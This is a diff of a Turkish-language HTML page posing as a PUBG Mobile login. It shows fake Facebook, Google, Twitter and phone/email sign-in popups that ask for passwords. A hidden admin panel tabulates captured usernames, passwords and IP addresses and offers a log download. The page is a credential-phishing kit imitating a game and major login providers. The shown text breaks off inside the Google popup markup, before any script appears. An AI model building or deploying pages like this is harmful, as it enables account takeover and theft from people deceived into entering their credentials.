@@ -1,1097 +1,1143 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>PUBG Mobile Giriş</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<style>
-* {
-margin: 0;
-padding: 0;
-box-sizing: border-box;
-}
-
-body {
-font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-color: white;
-min-height: 100vh;
-position: relative;
-overflow-x: hidden;
-display: flex;
-justify-content: center;
-align-items: center;
-background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
-url('https://images.wallpapersden.com/image/download/pubg-mobile-2021-new_bGpoa2WUmZqaraWkpJRobWllrWdma2U.jpg') no-repeat center center;
-background-size: cover;
-background-attachment: fixed;
-}
-
-/* Mobile Background */
-@media (max-width: 768px) {
-body {
-background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
-url('https://wallpapercave.com/wp/wp5281783.jpg') no-repeat center center;
-background-size: cover;
-}
-}
-
-.content-container {
-position: relative;
-z-index: 2;
-width: 100%;
-max-width: 500px;
-padding: 30px;
-text-align: center;
-margin: 20px;
-backdrop-filter: blur(5px);
-border-radius: 15px;
-background: rgba(20, 20, 30, 0.5);
-box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-border: 1px solid rgba(255, 50, 50, 0.3);
-}
-
-.logo {
-font-size: 48px;
-font-weight: bold;
-text-align: center;
-margin-bottom: 30px;
-text-transform: uppercase;
-font-family: 'Orbitron', sans-serif;
-letter-spacing: 2px;
-text-shadow: 0 0 15px rgba(255, 50, 50, 0.7);
-position: relative;
-padding-bottom: 20px;
-animation: pulse 3s infinite;
-}
-
-.logo::after {
-content: '';
-position: absolute;
-bottom: 0;
-left: 50%;
-transform: translateX(-50%);
-width: 80px;
-height: 4px;
-background: linear-gradient(90deg, #ff3232, #b30000);
-border-radius: 2px;
-}
-
-.logo span {
-font-size: 32px;
-display: block;
-color: #ffd700;
-margin-top: 10px;
-text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
-}
-
-.buttons {
-display: flex;
-flex-direction: column;
-gap: 15px;
-margin-bottom: 20px;
-}
-
-button {
-padding: 16px 24px;
-font-size: 16px;
-border: none;
-border-radius: 10px;
-cursor: pointer;
-width: 100%;
-max-width: 320px;
-margin: 0 auto;
-transition: all 0.3s ease;
-display: flex;
-align-items: center;
-justify-content: center;
-gap: 12px;
-font-weight: 600;
-position: relative;
-overflow: hidden;
-box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-}
-
-button::after {
-content: '';
-position: absolute;
-top: -50%;
-left: -60%;
-width: 20%;
-height: 200%;
-background: rgba(255, 255, 255, 0.3);
-transform: rotate(25deg);
-transition: all 0.7s;
-}
-
-button:hover::after {
-left: 140%;
-}
-
-button.facebook {
-background: linear-gradient(135deg, #3b5998, #2d4373);
-color: white;
-}
-
-button.google {
-background: linear-gradient(135deg, #db4437, #c1351d);
-color: white;
-}
-
-button.twitter {
-background: linear-gradient(135deg, #1da1f2, #0d8bd9);
-color: white;
-}
-
-button.phone {
-background: linear-gradient(135deg, #f4b400, #e0a300);
-color: #222;
-}
-
-button:hover {
-transform: translateY(-5px);
-box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
-}
-
-.legal {
-margin-top: 25px;
-font-size: 14px;
-text-align: center;
-padding: 15px 20px;
-max-width: 320px;
-margin: 0 auto;
-background: rgba(0, 0, 0, 0.3);
-border-radius: 8px;
-}
-
-.legal a {
-color: #4fc3f7;
-text-decoration: none;
-font-weight: 600;
-transition: all 0.3s;
-}
-
-.legal a:hover {
-color: #ffd700;
-text-shadow: 0 0 8px rgba(255, 215, 0, 0.5);
-}
-
-/* Admin Button - Smaller */
-.admin-btn {
-position: fixed;
-top: 15px;
-right: 15px;
-padding: 8px 16px;
-background: rgba(30, 30, 40, 0.8);
-border: 1px solid rgba(0, 100, 255, 0.5);
-border-radius: 30px;
-color: #1e90ff;
-font-weight: bold;
-cursor: pointer;
-transition: all 0.3s ease;
-font-family: 'Orbitron', sans-serif;
-letter-spacing: 1px;
-z-index: 100;
-font-size: 12px;
-box-shadow: 0 0 10px rgba(30, 144, 255, 0.3);
-z-index: 3;
-}
-
-.admin-btn:hover {
-background: rgba(0, 80, 200, 0.3);
-transform: translateY(-2px);
-box-shadow: 0 0 15px rgba(30, 144, 255, 0.5);
-}
-
-/* Admin Panel */
-.admin-panel {
-display: none;
-position: fixed;
-top: 0;
-left: 0;
-width: 100%;
-height: 100%;
-background: rgba(0, 0, 0, 0.95);
-z-index: 1000;
-overflow: auto;
-padding: 20px;
-z-index: 4;
-}
-
-.admin-panel-header {
-display: flex;
-justify-content: space-between;
-align-items: center;
-margin-bottom: 25px;
-padding-bottom: 15px;
-border-bottom: 1px solid rgba(0, 100, 255, 0.3);
-}
-
-.admin-panel-title {
-font-size: 28px;
-color: #1e90ff;
-font-family: 'Orbitron', sans-serif;
-letter-spacing: 1px;
-text-shadow: 0 0 10px rgba(30, 144, 255, 0.5);
-}
-
-.admin-buttons {
-display: flex;
-gap: 10px;
-}
-
-.admin-logout {
-padding: 10px 20px;
-background: rgba(255, 50, 50, 0.2);
-border: 1px solid rgba(255, 50, 50, 0.5);
-border-radius: 30px;
-color: #ff3232;
-cursor: pointer;
-transition: all 0.3s;
-font-family: 'Orbitron', sans-serif;
-}
-
-.admin-download {
-padding: 10px 20px;
-background: rgba(50, 205, 50, 0.2);
-border: 1px solid rgba(50, 205, 50, 0.5);
-border-radius: 30px;
-color: #32cd32;
-cursor: pointer;
-transition: all 0.3s;
-font-family: 'Orbitron', sans-serif;
-}
-
-.admin-logout:hover {
-background: rgba(255, 50, 50, 0.3);
-}
-
-.admin-download:hover {
-background: rgba(50, 205, 50, 0.3);
-}
-
-.admin-table {
-width: 100%;
-border-collapse: collapse;
-margin-bottom: 30px;
-background: rgba(20, 20, 30, 0.8);
-border-radius: 10px;
-overflow: hidden;
-box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-}
-
-.admin-table th {
-background: rgba(0, 80, 200, 0.5);
-padding: 15px;
-text-align: left;
-color: #fff;
-font-weight: 600;
-font-family: 'Orbitron', sans-serif;
-letter-spacing: 1px;
-}
-
-.admin-table td {
-padding: 12px 15px;
-border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-color: #ddd;
-font-size: 14px;
-}
-
-.admin-table tr:nth-child(even) {
-background: rgba(30, 30, 40, 0.5);
-}
-
-.admin-table tr:hover {
-background: rgba(50, 50, 70, 0.5);
-}
-
-.method-badge {
-display: inline-block;
-padding: 5px 12px;
-border-radius: 20px;
-font-size: 12px;
-font-weight: bold;
-}
-
-.method-facebook {
-background: rgba(59, 89, 152, 0.2);
-color: #3b5998;
-}
-
-.method-google {
-background: rgba(219, 68, 55, 0.2);
-color: #db4437;
-}
-
-.method-twitter {
-background: rgba(29, 161, 242, 0.2);
-color: #1da1f2;
-}
-
-.method-phone {
-background: rgba(244, 180, 0, 0.2);
-color: #f4b400;
-}
-
-/* Popup Styling */
-.popup {
-display: none;
-position: fixed;
-top: 0;
-left: 0;
-width: 100%;
-height: 100%;
-background: rgba(0, 0, 0, 0.9);
-z-index: 1001;
-justify-content: center;
-align-items: center;
-z-index: 5;
-}
-
-.popup-content {
-background: white;
-border-radius: 15px;
-width: 90%;
-max-width: 400px;
-box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
-position: relative;
-overflow: hidden;
-}
-
-.popup-header {
-padding: 25px;
-text-align: center;
-position: relative;
-}
-
-.popup-header::after {
-content: '';
-position: absolute;
-bottom: 0;
-left: 0;
-width: 100%;
-height: 1px;
-background: linear-gradient(to right, transparent, #eee, transparent);
-}
-
-.close-popup {
-position: absolute;
-top: 15px;
-right: 15px;
-color: #777;
-font-size: 24px;
-cursor: pointer;
-transition: color 0.3s;
-background: rgba(0, 0, 0, 0.05);
-border-radius: 50%;
-width: 32px;
-height: 32px;
-display: flex;
-align-items: center;
-justify-content: center;
-}
-
-.close-popup:hover {
-color: #ff3232;
-background: rgba(0, 0, 0, 0.1);
-}
-
-.popup-logo {
-font-size: 40px;
-margin-bottom: 15px;
-}
-
-.popup-title {
-font-size: 24px;
-font-weight: bold;
-color: #333;
-margin-bottom: 5px;
-}
-
-.popup-subtitle {
-font-size: 15px;
-color: #777;
-}
-
-.popup-form {
-padding: 25px;
-}
-
-.popup-form .input-group {
-margin-bottom: 20px;
-}
-
-.popup-form label {
-display: block;
-margin-bottom: 8px;
-color: #555;
-font-weight: 500;
-font-size: 14px;
-}
-
-.popup-form input {
-width: 100%;
-padding: 14px;
-border: 1px solid #ddd;
-border-radius: 8px;
-font-size: 16px;
-transition: all 0.3s;
-}
-
-.popup-form input:focus {
-outline: none;
-border-color: #aaa;
-box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.1);
-}
-
-.popup-submit {
-width: 100%;
-padding: 14px;
-border: none;
-border-radius: 8px;
-color: white;
-font-size: 16px;
-font-weight: bold;
-cursor: pointer;
-transition: all 0.3s ease;
-margin-top: 10px;
-}
-
-.popup-footer {
-padding: 20px;
-text-align: center;
-color: #777;
-font-size: 14px;
-background: #f9f9f9;
-border-top: 1px solid #eee;
-}
-
-.popup-footer a {
-color: #1e90ff;
-text-decoration: none;
-font-weight: 500;
-}
-
-/* Facebook Popup */
-.facebook-popup .popup-header {
-background: #3b5998;
-color: white;
-}
-
-.facebook-popup .popup-logo {
-color: white;
-}
-
-.facebook-popup .popup-title,
-.facebook-popup .popup-subtitle {
-color: white;
-}
-
-.facebook-popup .popup-submit {
-background: #3b5998;
-}
-
-.facebook-popup .popup-submit:hover {
-background: #2d4373;
-}
-
-/* Google Popup */
-.google-popup .popup-header {
-background: #f1f1f1;
-}
-
-.google-popup .popup-logo {
-color: #db4437;
-}
-
-.google-popup .popup-title {
-color: #202124;
-}
-
-.google-popup .popup-form input:focus {
-border-color: #1a73e8;
-box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
-}
-
-.google-popup .popup-submit {
-background: #1a73e8;
-}
-
-.google-popup .popup-submit:hover {
-background: #0d62d9;
-}
-
-/* Twitter Popup */
-.twitter-popup .popup-header {
-background: #1da1f2;
-color: white;
-}
-
-.twitter-popup .popup-logo {
-color: white;
-}
-
-.twitter-popup .popup-title,
-.twitter-popup .popup-subtitle {
-color: white;
-}
-
-.twitter-popup .popup-submit {
-background: #1da1f2;
-}
-
-.twitter-popup .popup-submit:hover {
-background: #0d8bd9;
-}
-
-/* Phone Popup */
-.phone-popup .popup-header {
-background: #f4b400;
-}
-
-.phone-popup .popup-logo {
-color: #333;
-}
-
-.phone-popup .popup-title {
-color: #333;
-}
-
-.phone-popup .popup-form input:focus {
-border-color: #f4b400;
-box-shadow: 0 0 0 2px rgba(244, 180, 0, 0.2);
-}
-
-.phone-popup .popup-submit {
-background: #f4b400;
-color: #333;
-}
-
-.phone-popup .popup-submit:hover {
-background: #e0a300;
-}
-
-/* Animation for logo */
-@keyframes pulse {
-0% { transform: scale(1); }
-50% { transform: scale(1.05); }
-100% { transform: scale(1); }
-}
-
-/* Log Area */
-.log-area {
-background: rgba(20, 20, 30, 0.8);
-border-radius: 10px;
-padding: 15px;
-margin-top: 20px;
-max-height: 300px;
-overflow-y: auto;
-font-family: monospace;
-color: #4caf50;
-border: 1px solid rgba(50, 205, 50, 0.2);
-}
-
-.log-area p {
-margin: 8px 0;
-word-break: break-all;
-}
-
-/* Loading Spinner */
-.spinner {
-border: 4px solid rgba(0, 0, 0, 0.1);
-width: 36px;
-height: 36px;
-border-radius: 50%;
-border-left-color: #1e90ff;
-animation: spin 1s linear infinite;
-margin: 20px auto;
-display: none;
-}
-
-@keyframes spin {
-0% { transform: rotate(0deg); }
-100% { transform: rotate(360deg); }
-}
-
-/* Responsive */
-@media (max-width: 480px) {
-.logo {
-font-size: 36px;
-}
-
-.logo span {
-font-size: 24px;
-}
-
-button {
-width: 100%;
-font-size: 14px;
-padding: 14px;
-}
-
-.content-container {
-padding: 20px;
-}
-
-.admin-table th, 
-.admin-table td {
-padding: 10px;
-font-size: 12px;
-}
-
-.popup-content {
-width: 95%;
-}
-
-.admin-panel-header {
-flex-direction: column;
-gap: 10px;
-}
-
-.admin-buttons {
-width: 100%;
-justify-content: center;
-}
-
-.admin-btn {
-top: 10px;
-right: 10px;
-padding: 6px 12px;
-font-size: 11px;
-}
-}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PUBG Mobile Giriş</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: white;
+      min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
+                url('https://images.wallpapersden.com/image/download/pubg-mobile-2021-new_bGpoa2WUmZqaraWkpJRobWllrWdma2U.jpg') no-repeat center center;
+      background-size: cover;
+      background-attachment: fixed;
+    }
+    
+    /* Mobile Background */
+    @media (max-width: 768px) {
+      body {
+        background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
+                   url('https://wallpapercave.com/wp/wp5281783.jpg') no-repeat center center;
+        background-size: cover;
+      }
+    }
+    
+    .content-container {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      max-width: 500px;
+      padding: 30px;
+      text-align: center;
+      margin: 20px;
+    }
+    
+    .logo {
+      font-size: 48px;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 30px;
+      text-transform: uppercase;
+      font-family: 'Orbitron', sans-serif;
+      letter-spacing: 2px;
+      text-shadow: 0 0 15px rgba(255, 50, 50, 0.7);
+      position: relative;
+      padding-bottom: 20px;
+      animation: pulse 3s infinite;
+    }
+    
+    .logo::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 4px;
+      background: linear-gradient(90deg, #ff3232, #b30000);
+      border-radius: 2px;
+    }
+    
+    .logo span {
+      font-size: 32px;
+      display: block;
+      color: #ffd700;
+      margin-top: 10px;
+      text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+    }
+    
+    .buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+    
+    button {
+      padding: 16px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      width: 100%;
+      max-width: 320px;
+      margin: 0 auto;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-weight: 600;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+    
+    button::after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -60%;
+      width: 20%;
+      height: 200%;
+      background: rgba(255, 255, 255, 0.3);
+      transform: rotate(25deg);
+      transition: all 0.7s;
+    }
+    
+    button:hover::after {
+      left: 140%;
+    }
+    
+    button.facebook {
+      background: linear-gradient(135deg, #3b5998, #2d4373);
+      color: white;
+    }
+    
+    button.google {
+      background: linear-gradient(135deg, #db4437, #c1351d);
+      color: white;
+    }
+    
+    button.twitter {
+      background: linear-gradient(135deg, #1da1f2, #0d8bd9);
+      color: white;
+    }
+    
+    button.phone {
+      background: linear-gradient(135deg, #f4b400, #e0a300);
+      color: #222;
+    }
+    
+    button:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+    }
+    
+    .legal {
+      margin-top: 25px;
+      font-size: 14px;
+      text-align: center;
+      padding: 15px 20px;
+      max-width: 320px;
+      margin: 0 auto;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 8px;
+    }
+    
+    .legal a {
+      color: #4fc3f7;
+      text-decoration: none;
+      font-weight: 600;
+      transition: all 0.3s;
+    }
+    
+    .legal a:hover {
+      color: #ffd700;
+      text-shadow: 0 0 8px rgba(255, 215, 0, 0.5);
+    }
+    
+    /* Admin Button - Smaller */
+    .admin-btn {
+      position: fixed;
+      top: 15px;
+      right: 15px;
+      padding: 8px 16px;
+      background: rgba(30, 30, 40, 0.8);
+      border: 1px solid rgba(0, 100, 255, 0.5);
+      border-radius: 30px;
+      color: #1e90ff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      font-family: 'Orbitron', sans-serif;
+      letter-spacing: 1px;
+      z-index: 100;
+      font-size: 12px;
+      box-shadow: 0 0 10px rgba(30, 144, 255, 0.3);
+      z-index: 3;
+    }
+    
+    .admin-btn:hover {
+      background: rgba(0, 80, 200, 0.3);
+      transform: translateY(-2px);
+      box-shadow: 0 0 15px rgba(30, 144, 255, 0.5);
+    }
+    
+    /* Admin Panel */
+    .admin-panel {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.95);
+      z-index: 1000;
+      overflow: auto;
+      padding: 20px;
+      z-index: 4;
+    }
+    
+    .admin-panel-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid rgba(0, 100, 255, 0.3);
+    }
+    
+    .admin-panel-title {
+      font-size: 28px;
+      color: #1e90ff;
+      font-family: 'Orbitron', sans-serif;
+      letter-spacing: 1px;
+      text-shadow: 0 0 10px rgba(30, 144, 255, 0.5);
+    }
+    
+    .admin-buttons {
+      display: flex;
+      gap: 10px;
+    }
+    
+    .admin-logout {
+      padding: 10px 20px;
+      background: rgba(255, 50, 50, 0.2);
+      border: 1px solid rgba(255, 50, 50, 0.5);
+      border-radius: 30px;
+      color: #ff3232;
+      cursor: pointer;
+      transition: all 0.3s;
+      font-family: 'Orbitron', sans-serif;
+    }
+    
+    .admin-download {
+      padding: 10px 20px;
+      background: rgba(50, 205, 50, 0.2);
+      border: 1px solid rgba(50, 205, 50, 0.5);
+      border-radius: 30px;
+      color: #32cd32;
+      cursor: pointer;
+      transition: all 0.3s;
+      font-family: 'Orbitron', sans-serif;
+    }
+    
+    .admin-logout:hover {
+      background: rgba(255, 50, 50, 0.3);
+    }
+    
+    .admin-download:hover {
+      background: rgba(50, 205, 50, 0.3);
+    }
+    
+    .admin-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 30px;
+      background: rgba(20, 20, 30, 0.8);
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
+    
+    .admin-table th {
+      background: rgba(0, 80, 200, 0.5);
+      padding: 15px;
+      text-align: left;
+      color: #fff;
+      font-weight: 600;
+      font-family: 'Orbitron', sans-serif;
+      letter-spacing: 1px;
+    }
+    
+    .admin-table td {
+      padding: 12px 15px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      color: #ddd;
+      font-size: 14px;
+    }
+    
+    .admin-table tr:nth-child(even) {
+      background: rgba(30, 30, 40, 0.5);
+    }
+    
+    .admin-table tr:hover {
+      background: rgba(50, 50, 70, 0.5);
+    }
+    
+    .method-badge {
+      display: inline-block;
+      padding: 5px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+    
+    .method-facebook {
+      background: rgba(59, 89, 152, 0.2);
+      color: #3b5998;
+    }
+    
+    .method-google {
+      background: rgba(219, 68, 55, 0.2);
+      color: #db4437;
+    }
+    
+    .method-twitter {
+      background: rgba(29, 161, 242, 0.2);
+      color: #1da1f2;
+    }
+    
+    .method-phone {
+      background: rgba(244, 180, 0, 0.2);
+      color: #f4b400;
+    }
+    
+    /* Popup Styling */
+    .popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      z-index: 1001;
+      justify-content: center;
+      align-items: center;
+      z-index: 5;
+    }
+    
+    .popup-content {
+      background: white;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .popup-header {
+      padding: 25px;
+      text-align: center;
+      position: relative;
+    }
+    
+    .popup-header::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 1px;
+      background: linear-gradient(to right, transparent, #eee, transparent);
+    }
+    
+    .close-popup {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      color: #777;
+      font-size: 24px;
+      cursor: pointer;
+      transition: color 0.3s;
+      background: rgba(0, 0, 0, 0.05);
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .close-popup:hover {
+      color: #ff3232;
+      background: rgba(0, 0, 0, 0.1);
+    }
+    
+    .popup-logo {
+      font-size: 40px;
+      margin-bottom: 15px;
+    }
+    
+    .popup-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 5px;
+    }
+    
+    .popup-subtitle {
+      font-size: 15px;
+      color: #777;
+    }
+    
+    .popup-form {
+      padding: 25px;
+    }
+    
+    .popup-form .input-group {
+      margin-bottom: 20px;
+    }
+    
+    .popup-form label {
+      display: block;
+      margin-bottom: 8px;
+      color: #555;
+      font-weight: 500;
+      font-size: 14px;
+    }
+    
+    .popup-form input {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: all 0.3s;
+    }
+    
+    .popup-form input:focus {
+      outline: none;
+      border-color: #aaa;
+      box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.1);
+    }
+    
+    .popup-submit {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+    }
+    
+    .popup-footer {
+      padding: 20px;
+      text-align: center;
+      color: #777;
+      font-size: 14px;
+      background: #f9f9f9;
+      border-top: 1px solid #eee;
+    }
+    
+    .popup-footer a {
+      color: #1e90ff;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    
+    /* Facebook Popup */
+    .facebook-popup .popup-header {
+      background: #3b5998;
+      color: white;
+    }
+    
+    .facebook-popup .popup-logo {
+      color: white;
+    }
+    
+    .facebook-popup .popup-title,
+    .facebook-popup .popup-subtitle {
+      color: white;
+    }
+    
+    .facebook-popup .popup-submit {
+      background: #3b5998;
+    }
+    
+    .facebook-popup .popup-submit:hover {
+      background: #2d4373;
+    }
+    
+    /* Google Popup */
+    .google-popup .popup-header {
+      background: #f1f1f1;
+    }
+    
+    .google-popup .popup-logo {
+      color: #db4437;
+    }
+    
+    .google-popup .popup-title {
+      color: #202124;
+    }
+    
+    .google-popup .popup-form input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+    }
+    
+    .google-popup .popup-submit {
+      background: #1a73e8;
+    }
+    
+    .google-popup .popup-submit:hover {
+      background: #0d62d9;
+    }
+    
+    /* Twitter Popup */
+    .twitter-popup .popup-header {
+      background: #1da1f2;
+      color: white;
+    }
+    
+    .twitter-popup .popup-logo {
+      color: white;
+    }
+    
+    .twitter-popup .popup-title,
+    .twitter-popup .popup-subtitle {
+      color: white;
+    }
+    
+    .twitter-popup .popup-submit {
+      background: #1da1f2;
+    }
+    
+    .twitter-popup .popup-submit:hover {
+      background: #0d8bd9;
+    }
+    
+    /* Phone Popup */
+    .phone-popup .popup-header {
+      background: #f4b400;
+    }
+    
+    .phone-popup .popup-logo {
+      color: #333;
+    }
+    
+    .phone-popup .popup-title {
+      color: #333;
+    }
+    
+    .phone-popup .popup-form input:focus {
+      border-color: #f4b400;
+      box-shadow: 0 0 0 2px rgba(244, 180, 0, 0.2);
+    }
+    
+    .phone-popup .popup-submit {
+      background: #f4b400;
+      color: #333;
+    }
+    
+    .phone-popup .popup-submit:hover {
+      background: #e0a300;
+    }
+    
+    /* Animation for logo */
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    /* Log Area */
+    .log-area {
+      background: rgba(20, 20, 30, 0.8);
+      border-radius: 10px;
+      padding: 15px;
+      margin-top: 20px;
+      max-height: 300px;
+      overflow-y: auto;
+      font-family: monospace;
+      color: #4caf50;
+      border: 1px solid rgba(50, 205, 50, 0.2);
+    }
+    
+    .log-area p {
+      margin: 8px 0;
+      word-break: break-all;
+    }
+    
+    /* Loading Spinner */
+    .spinner {
+      border: 4px solid rgba(0, 0, 0, 0.1);
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border-left-color: #1e90ff;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+      display: none;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    /* Responsive */
+    @media (max-width: 480px) {
+      .logo {
+        font-size: 36px;
+      }
+      
+      .logo span {
+        font-size: 24px;
+      }
+      
+      button {
+        width: 100%;
+        font-size: 14px;
+        padding: 14px;
+      }
+      
+      .content-container {
+        padding: 20px;
+      }
+      
+      .admin-table th, 
+      .admin-table td {
+        padding: 10px;
+        font-size: 12px;
+      }
+      
+      .popup-content {
+        width: 95%;
+      }
+      
+      .admin-panel-header {
+        flex-direction: column;
+        gap: 10px;
+      }
+      
+      .admin-buttons {
+        width: 100%;
+        justify-content: center;
+      }
+      
+      .admin-btn {
+        top: 10px;
+        right: 10px;
+        padding: 6px 12px;
+        font-size: 11px;
+      }
+    }
+  </style>
 </head>
 <body>
-<button class="admin-btn" id="adminButton">
-<i class="fas fa-user-secret"></i> ADMIN
-</button>
-
-<div class="content-container">
-<div class="logo">PUBG<br><span>MOBILE</span></div>
-<div class="buttons">
-<button class="facebook" id="facebookLogin">
-<i class="fab fa-facebook-f"></i> Login with Facebook
-</button>
-<button class="google" id="googleLogin">
-<i class="fab fa-google"></i> Sign in with Google
-</button>
-<button class="twitter" id="twitterLogin">
-<i class="fab fa-twitter"></i> Sign in with Twitter
-</button>
-<button class="phone" id="phoneLogin">
-<i class="fas fa-envelope"></i> Phone / Email
-</button>
-</div>
-<div class="legal">
-<label>
-<input type="checkbox" id="policyCheck" checked />
-Okudum ve kabul ediyorum:
-<a href="#">Gizlilik Politikası</a> &
-<a href="#">Kullanıcı Sözleşmesi</a>
-</label>
-</div>
-</div>
-
-<!-- Admin Panel -->
-<div class="admin-panel" id="adminPanel">
-<div class="admin-panel-header">
-<div class="admin-panel-title">PUBG MOBILE - ADMIN PANELİ</div>
-<div class="admin-buttons">
-<div class="admin-download" id="downloadLogs">
-<i class="fas fa-download"></i> Logları İndir
-</div>
-<div class="admin-logout" id="adminLogout">
-<i class="fas fa-sign-out-alt"></i> ÇIKIŞ YAP
-</div>
-</div>
-</div>
-
-<div class="spinner" id="loadingSpinner"></div>
-
-<table class="admin-table">
-<thead>
-<tr>
-<th>ID</th>
-<th>Zaman</th>
-<th>Kullanıcı Adı</th>
-<th>Şifre</th>
-<th>Yöntem</th>
-<th>IP Adresi</th>
-</tr>
-</thead>
-<tbody id="loginData">
-<!-- Login data will appear here -->
-</tbody>
-</table>
-
-<div class="log-area" id="logArea">
-<!-- Log data will appear here -->
-</div>
-</div>
-
-<!-- Popups -->
-<div class="popup facebook-popup" id="facebookPopup">
-<div class="popup-content">
-<div class="popup-header">
-<span class="close-popup" id="closeFacebookPopup">&times;</span>
-<div class="popup-logo">
-<i class="fab fa-facebook-f"></i>
-</div>
-<h3 class="popup-title">Facebook ile Giriş Yap</h3>
-<p class="popup-subtitle">PUBG Mobile hesabınıza bağlanın</p>
-</div>
-
-<form class="popup-form" id="facebookForm">
-<div class="input-group">
-<label for="facebookEmail">E-posta veya Telefon</label>
-<input type="text" id="facebookEmail" required>
-</div>
-
-<div class="input-group">
-<label for="facebookPassword">Şifre</label>
-<input type="password" id="facebookPassword" required>
-</div>
-
-<button type="submit" class="popup-submit">GİRİŞ YAP</button>
-</form>
-
-<div class="popup-footer">
-<a href="#">Hesabınıza erişimde sorun mu yaşıyorsunuz?</a>
-</div>
-</div>
-</div>
-
-<div class="popup google-popup" id="googlePopup">
-<div class="popup-content">
-<div class="popup-header">
-<span class="close-popup" id="closeGooglePopup">&times;</span>
-<div class="popup-logo">
-<i class="fab fa-google"></i>
-</div>
-<h3 class="popup-title">Google ile Giriş Yap</h3>
-<p class="popup-subtitle">PUBG Mobile hesabınıza devam edin</p>
-</div>
-
-<form class="popup-form" id="googleForm">
-<div class="input-group">
-<label for="googleEmail">E-posta veya Telefon</label>
-<input type="text" id="googleEmail" required>
-</div>
-
-<div class="input-group">
-<label for="googlePassword">Şifrenizi girin</label>
-<input type="password" id="googlePassword" required>
-</div>
-
-<div class="input-group" style="flex-direction: row; align-items: center; gap: 10px;">
-<input type="checkbox" id="googleRemember">
-<label for="googleRemember" style="margin-bottom: 0;">Beni hatırla</label>
-</div>
-
-<button type="submit" class="popup-submit">İleri</button>
-</form>
-
-<div class="popup-footer">
-<a href="#">Şifrenizi mi unuttunuz?</a>
-</div>
